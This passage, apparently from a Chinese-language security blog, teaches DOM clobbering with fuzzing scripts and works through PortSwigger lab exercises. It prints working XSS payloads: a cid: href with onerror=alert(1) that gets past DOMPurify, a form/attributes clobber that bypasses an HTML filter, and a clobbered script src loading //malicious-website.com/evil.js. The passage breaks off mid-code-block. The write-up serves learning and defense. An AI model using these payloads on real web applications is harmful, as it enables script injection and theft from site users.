class="p">,</span><span class="s2">&#34;noembed&#34;</span><span class="p">,</span><span class="s2">&#34;noframes&#34;</span><span class="p">,</span><span class="s2">&#34;noscript&#34;</span><span class="p">,</span><span class="s2">&#34;object&#34;</span><span class="p">,</span><span class="s2">&#34;ol&#34;</span><span class="p">,</span><span class="s2">&#34;optgroup&#34;</span><span class="p">,</span><span class="s2">&#34;option&#34;</span><span class="p">,</span><span class="s2">&#34;output&#34;</span><span class="p">,</span><span class="s2">&#34;p&#34;</span><span class="p">,</span><span class="s2">&#34;param&#34;</span><span class="p">,</span><span class="s2">&#34;picture&#34;</span><span class="p">,</span><span class="s2">&#34;plaintext&#34;</span><span class="p">,</span><span class="s2">&#34;pre&#34;</span><span class="p">,</span><span class="s2">&#34;progress&#34;</span><span class="p">,</span><span class="s2">&#34;q&#34;</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">,</span><span class="s2">&#34;rp&#34;</span><span class="p">,</span><span class="s2">&#34;rt&#34;</span><span class="p">,</span><span class="s2">&#34;rtc&#34;</span><span class="p">,</span><span class="s2">&#34;ruby&#34;</span><span class="p">,</span><span class="s2">&#34;s&#34;</span><span class="p">,</span><span class="s2">&#34;samp&#34;</span><span class="p">,</span><span class="s2">&#34;script&#34;</span><span class="p">,</span><span class="s2">&#34;section&#34;</span><span class="p">,</span><span class="s2">&#34;select&#34;</span><span class="p">,</span><span class="s2">&#34;shadow&#34;</span><span class="p">,</span><span class="s2">&#34;slot&#34;</span><span class="p">,</span><span class="s2">&#34;small&#34;</span><span class="p">,</span><span class="s2">&#34;source&#34;</span><span class="p">,</span><span class="s2">&#34;spacer&#34;</span><span class="p">,</span><span class="s2">&#34;span&#34;</span><span class="p">,</span><span class="s2">&#34;strike&#34;</span><span class="p">,</span><span class="s2">&#34;strong&#34;</span><span class="p">,</span><span class="s2">&#34;style&#34;</span><span class="p">,</span><span class="s2">&#34;sub&#34;</span><span class="p">,</span><span class="s2">&#34;summary&#34;</span><span class="p">,</span><span class="s2">&#34;sup&#34;</span><span class="p">,</span><span class="s2">&#34;svg&#34;</span><span class="p">,</span><span class="s2">&#34;table&#34;</span><span class="p">,</span><span class="s2">&#34;tbody&#34;</span><span class="p">,</span><span class="s2">&#34;td&#34;</span><span class="p">,</span><span class="s2">&#34;template&#34;</span><span class="p">,</span><span class="s2">&#34;textarea&#34;</span><span class="p">,</span><span class="s2">&#34;tfoot&#34;</span><span class="p">,</span><span class="s2">&#34;th&#34;</span><span class="p">,</span><span class="s2">&#34;thead&#34;</span><span class="p">,</span><span class="s2">&#34;time&#34;</span><span class="p">,</span><span class="s2">&#34;title&#34;</span><span class="p">,</span><span class="s2">&#34;tr&#34;</span><span class="p">,</span><span class="s2">&#34;track&#34;</span><span class="p">,</span><span class="s2">&#34;tt&#34;</span><span class="p">,</span><span class="s2">&#34;u&#34;</span><span class="p">,</span><span class="s2">&#34;ul&#34;</span><span class="p">,</span><span class="s2">&#34;var&#34;</span><span class="p">,</span><span class="s2">&#34;video&#34;</span><span class="p">,</span><span class="s2">&#34;wbr&#34;</span><span class="p">,</span><span class="s2">&#34;xmp&#34;</span><span class="p">],</span> <span class="nx">logs</span> <span class="o">=</span> <span class="p">[];</span>
-</span></span><span class="line"><span class="cl"><span class="nx">div</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">html</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">j</span><span class="o">&lt;</span><span class="nx">html</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">div</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s1">&#39;&lt;&#39;</span><span class="o">+</span><span class="nx">html</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39; id=element1&gt;&#39;</span><span class="o">+</span><span class="s1">&#39;&lt;&#39;</span><span class="o">+</span><span class="nx">html</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39; id=element2&gt;&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">div</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">element1</span> <span class="o">&amp;&amp;</span> <span class="nx">element1</span><span class="p">.</span><span class="nx">element2</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">       <span class="nx">log</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">html</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39;,&#39;</span><span class="o">+</span><span class="nx">html</span><span class="p">[</span><span class="nx">j</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">div</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">log</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;\n&#39;</span><span class="p">));</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>以上代码测试了现在 HTML5 基本上所有的标签，使用两层的层级关系进行 fuzz ，注意这里只使用了<code>id</code>，并没有使用<code>name</code>，与上文的<code>HTMLCollection</code>并不是一种方法。</p>
-<p>我们可以得到的是以下关系：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">form-&gt;button
-</span></span><span class="line"><span class="cl">form-&gt;fieldset
-</span></span><span class="line"><span class="cl">form-&gt;image
-</span></span><span class="line"><span class="cl">form-&gt;img
-</span></span><span class="line"><span class="cl">form-&gt;input
-</span></span><span class="line"><span class="cl">form-&gt;object
-</span></span><span class="line"><span class="cl">form-&gt;output
-</span></span><span class="line"><span class="cl">form-&gt;select
-</span></span><span class="line"><span class="cl">form-&gt;textarea
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如果我们想要构建<code>x.y</code>的形式，我们可以这么构建：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span><span class="p">&gt;&lt;</span><span class="nt">output</span> <span class="na">id</span><span class="o">=</span><span class="s">y</span><span class="p">&gt;</span>I&#39;ve been clobbered<span class="p">&lt;/</span><span class="nt">output</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nx">alert</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="三级关系xyz的写法">三级关系x.y.z的写法
-</h3><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;x&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;y&#34;</span><span class="p">&gt;&lt;</span><span class="nt">output</span> <span class="na">id</span><span class="o">=</span><span class="s">z</span><span class="p">&gt;</span>I&#39;ve been clobbered<span class="p">&lt;/</span><span class="nt">output</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;x&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> 
-</span></span><span class="line"><span class="cl">    <span class="nx">alert</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">.</span><span class="nx">z</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="自定义属性构造">自定义属性构造
-</h3><p>以上我们都是通过 id 或者 name 来利用，那我们能不能通过自定义属性来构造呢？</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span> <span class="na">y</span><span class="o">=</span><span class="s">123</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nx">alert</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">)</span><span class="c1">//undefined
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>很明显，这意味着任何未定义的属性都不会具有 DOM 属性，所以就返回了 <code>undefined</code></p>
-<p>我们可以尝试一下 fuzz 所有标签的有没有字符串类型的属性可供我们使用：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="p">[...]</span><span class="c1">//HTML elements array
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">props</span><span class="o">=</span><span class="p">[];</span>
-</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">html</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">  <span class="nx">obj</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">html</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="nx">prop</span> <span class="k">in</span> <span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">obj</span><span class="p">[</span><span class="nx">prop</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">   <span class="k">try</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">DOM</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s1">&#39;&lt;&#39;</span><span class="o">+</span><span class="nx">html</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39; id=x &#39;</span><span class="o">+</span><span class="nx">prop</span><span class="o">+</span><span class="s1">&#39;=1&gt;&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">)[</span><span class="nx">prop</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">       <span class="nx">props</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">html</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39;:&#39;</span><span class="o">+</span><span class="nx">prop</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"> <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">([...</span><span class="k">new</span> <span class="nx">Set</span><span class="p">(</span><span class="nx">props</span><span class="p">)].</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;\n&#39;</span><span class="p">));</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们可以得到一系列的标签以及其属性名称，例如我们可以利用其中的<code>a:title</code>来进行组合</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span> <span class="na">title</span><span class="o">=</span><span class="s">&#39;hasaki&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">title</span><span class="p">);</span><span class="c1">//hasaki
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>其中在我们第一步得到的属性中比较有意思的是 a 标签的<code>username</code>跟<code>password</code>属性，虽然我们不能直接通过<code>title</code>这种形式利用，但是我们可以通过<code>href</code>的形式来进行利用：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;ftp:Clobbered-username:Clobbered-Password@a&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nx">alert</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">username</span><span class="p">)</span><span class="c1">//Clobbered-username
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">alert</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">password</span><span class="p">)</span><span class="c1">//Clobbered-password
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="bp靶场练习">bp靶场练习
-</h2><p>bp官方说这个漏洞的利用点在于</p>
-<p>如果有全局变量定义为</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">someObject</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">someObject</span> <span class="o">||</span> <span class="p">{};</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们可以尝试以下代码覆盖</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">someObject</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">someObject</span> <span class="o">||</span> <span class="p">{};</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">someObject</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">};</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>甚至注入外部js脚本</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">someObject</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">someObject</span> <span class="na">name</span><span class="o">=</span><span class="s">url</span> <span class="na">href</span><span class="o">=</span><span class="s">//malicious-website.com/evil.js</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="exploiting-dom-clobbering-to-enable-xss">Exploiting DOM clobbering to enable XSS
-</h3><p>上来是一个博客界面，随便点一个进去可以看到评论界面,查看源码看到两个js</p>
-<p><img src="/p/dom-clobbering/image-20250809155319123.png"
-	width="1149"
-	height="363"
-	srcset="/p/dom-clobbering/image-20250809155319123_hu8722143109655760245.png 480w, /p/dom-clobbering/image-20250809155319123_hu5162355678809315551.png 1024w"
-	loading="lazy"
-	
-		alt="image-20250809155319123"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="316"
-		data-flex-basis="759px"
-	
-></p>
-<p>第一个domPurify-2.0.15.js是用来防御xss的，而第二个js可能就是我们利用漏洞的地方了</p>
-<p>在它的displayComments函数我们看到了熟悉的全局变量</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">defaultAvatar</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">defaultAvatar</span> <span class="o">||</span> <span class="p">{</span><span class="nx">avatar</span><span class="o">:</span> <span class="s1">&#39;/resources/images/avatarDefault.svg&#39;</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">avatarImgHTML</span> <span class="o">=</span> <span class="s1">&#39;&lt;img class=&#34;avatar&#34; src=&#34;&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="nx">comment</span><span class="p">.</span><span class="nx">avatar</span> <span class="o">?</span> <span class="nx">escapeHTML</span><span class="p">(</span><span class="nx">comment</span><span class="p">.</span><span class="nx">avatar</span><span class="p">)</span> <span class="o">:</span> <span class="nx">defaultAvatar</span><span class="p">.</span><span class="nx">avatar</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;&#34;&gt;&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">divImgContainer</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;div&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">divImgContainer</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">avatarImgHTML</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们可以用 Dom Clobbering 来控制 <code>window.defaultAvatar</code>.只要我们原来没有头像就可以用一个构造一个<code>defaultAvatar.avatar</code>进行 XSS 了。</p>
-<p>根据前面我们学的，这是一个二级关系，我们可以用htmlcollection</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">defaultAvatar</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">defaultAvatar</span> <span class="na">name</span><span class="o">=</span><span class="s">avatar</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;cid:&amp;quot;onerror=alert(1)//&#34;</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里的<code>&quot;</code>要转成html实体编码</p>
-<p>改变完defaultAvatar的值之后，只要随便评论就能触发恶意代码导致xss</p>
-<p><img src="/p/dom-clobbering/image-20250809161447107.png"
-	width="741"
-	height="134"
-	srcset="/p/dom-clobbering/image-20250809161447107_hu2851931967000954802.png 480w, /p/dom-clobbering/image-20250809161447107_hu18379533699058463645.png 1024w"
-	loading="lazy"
-	
-		alt="image-20250809161447107"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="552"
-		data-flex-basis="1327px"
-	
-></p>
-<p>可以看到我们已经插入了恶意代码，然后我们随意评论aaa，返回的时候直接触发了</p>
-<p><img src="/p/dom-clobbering/image-20250809163114220.png"
-	width="552"
-	height="177"
-	srcset="/p/dom-clobbering/image-20250809163114220_hu6207664759126568861.png 480w, /p/dom-clobbering/image-20250809163114220_hu18143061411743553597.png 1024w"
-	loading="lazy"
-	
-		alt="image-20250809163114220"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="311"
-		data-flex-basis="748px"
-	
-></p>
-<p>这里我很奇怪为什么这个href只能是cid开头，而别的不行，然后看了官方题解说是cid协议，它不使用url编码双引号，就能用html实体编码来注入，使得下一次的全局变量avatar为恶意代码</p>
-<h3 id="clobbering-dom-attributes-to-bypass-html-filters">Clobbering DOM attributes to bypass HTML filters
-</h3><p>这里就要用到上面二级关系的第二种办法，form标签与其他标签的层级关系</p>
-<p>例如</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">onclick</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">attributes</span><span class="p">&gt;</span>Click me
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里点进去依旧看源码</p>
-<p>这题比上题安全多了，没有直接用windows这种来调用全局变量</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">a</span> <span class="o">&lt;</span> <span class="nx">node</span><span class="p">.</span><span class="nx">attributes</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">a</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">attr</span> <span class="o">=</span> <span class="nx">node</span><span class="p">.</span><span class="nx">attributes</span><span class="p">[</span><span class="nx">a</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">shouldRejectAttr</span><span class="p">(</span><span class="nx">attr</span><span class="p">,</span> <span class="nx">allowedAttrs</span><span class="p">,</span> <span class="nx">node</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="nx">node</span><span class="p">.</span><span class="nx">removeAttribute</span><span class="p">(</span><span class="nx">attr</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="c1">// Shift the array to continue looping.
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">a</span> <span class="o">=</span> <span class="nx">a</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们可以构造一个包含有<code>name=attributes</code>的子节点的 payload 绕过属性的 check ，这里给定的白名单标签也比较明显，我们可以通过 HTML Relationships 来构造我们的 payload</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
